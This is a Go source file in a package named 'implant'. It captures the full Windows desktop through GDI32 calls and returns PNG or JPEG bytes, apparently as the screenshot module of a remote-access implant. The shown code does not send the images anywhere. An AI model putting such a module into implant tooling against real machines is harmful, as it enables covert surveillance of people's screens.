//go:build windows

package implant

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"image"
	"image/jpeg"
	"image/png"
	"syscall"
	"unsafe"
)

var (
	user32 = syscall.NewLazyDLL("user32.dll")
	gdi32  = syscall.NewLazyDLL("gdi32.dll")

	procGetDC            = user32.NewProc("GetDC")
	procReleaseDC        = user32.NewProc("ReleaseDC")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")

	procCreateCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
	procCreateDIBSection   = gdi32.NewProc("CreateDIBSection")
	procSelectObject       = gdi32.NewProc("SelectObject")
	procBitBlt             = gdi32.NewProc("BitBlt")
	procDeleteDC           = gdi32.NewProc("DeleteDC")
	procDeleteObject       = gdi32.NewProc("DeleteObject")
)

const (
	SRCCOPY        = 0x00CC0020
	SM_CXSCREEN    = 0
	SM_CYSCREEN    = 1
	DIB_RGB_COLORS = 0
	BI_RGB         = 0
)

// captureScreenRaw captures the entire desktop using GDI32 and returns
// BGRA pixel data, width, and height. The caller must not modify the returned slice.
func captureScreenRaw() ([]byte, int, int, error) {
	hdcScreen, _, _ := procGetDC.Call(0)
	if hdcScreen == 0 {
		return nil, 0, 0, fmt.Errorf("GetDC failed")
	}
	defer procReleaseDC.Call(0, hdcScreen)

	width, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	height, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
	if width == 0 || height == 0 {
		return nil, 0, 0, fmt.Errorf("GetSystemMetrics returned zero dimensions")
	}

	w := int32(width)
	h := int32(height)

	// Build BITMAPINFOHEADER — 32-bit BI_RGB, negative height = top-down
	bmi := make([]byte, 40)
	binary.LittleEndian.PutUint32(bmi[0:4], 40)
	binary.LittleEndian.PutUint32(bmi[4:8], uint32(w))
	binary.LittleEndian.PutUint32(bmi[8:12], uint32(-h))
	binary.LittleEndian.PutUint16(bmi[12:14], 1)
	binary.LittleEndian.PutUint16(bmi[14:16], 32)
	binary.LittleEndian.PutUint32(bmi[16:20], BI_RGB)

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return nil, 0, 0, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer procDeleteDC.Call(hdcMem)

	var pBits unsafe.Pointer
	hDib, _, _ := procCreateDIBSection.Call(
		hdcScreen,
		uintptr(unsafe.Pointer(&bmi[0])),
		DIB_RGB_COLORS,
		uintptr(unsafe.Pointer(&pBits)),
		0, 0,
	)
	if hDib == 0 {
		return nil, 0, 0, fmt.Errorf("CreateDIBSection failed")
	}
	defer procDeleteObject.Call(hDib)

	oldObj, _, _ := procSelectObject.Call(hdcMem, hDib)
	defer procSelectObject.Call(hdcMem, oldObj)

	ret, _, _ := procBitBlt.Call(hdcMem, 0, 0, uintptr(w), uintptr(h), hdcScreen, 0, 0, SRCCOPY)
	if ret == 0 {
		return nil, 0, 0, fmt.Errorf("BitBlt failed")
	}

	pixelCount := int(w) * int(h)
	pixelData := make([]byte, pixelCount*4)
	copy(pixelData, unsafe.Slice((*byte)(pBits), pixelCount*4))

	return pixelData, int(w), int(h), nil
}

// bgraToRGBA converts BGRA pixel data to an *image.RGBA.
func bgraToRGBA(pixels []byte, w, h int) *image.RGBA {
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	pixelCount := w * h
	for i := 0; i < pixelCount; i++ {
		src := pixels[i*4 : i*4+4]
		dst := img.Pix[i*4 : i*4+4]
		dst[0] = src[2] // R ← B
		dst[1] = src[1] // G ← G
		dst[2] = src[0] // B ← R
		dst[3] = 255    // A
	}
	return img
}

// CaptureScreenshot captures the entire desktop and returns PNG-encoded bytes.
func CaptureScreenshot() ([]byte, error) {
	pixels, w, h, err := captureScreenRaw()
	if err != nil {
		return nil, err
	}
	img := bgraToRGBA(pixels, w, h)
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, fmt.Errorf("PNG encode: %w", err)
	}
	return buf.Bytes(), nil
}

// CaptureScreenshotJPEG captures the entire desktop and returns JPEG-encoded bytes.
// quality ranges from 1 (worst) to 100 (best).
func CaptureScreenshotJPEG(quality int) ([]byte, error) {
	pixels, w, h, err := captureScreenRaw()
	if err != nil {
		return nil, err
	}
	img := bgraToRGBA(pixels, w, h)
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, fmt.Errorf("JPEG encode: %w", err)
	}
	return buf.Bytes(), nil
}
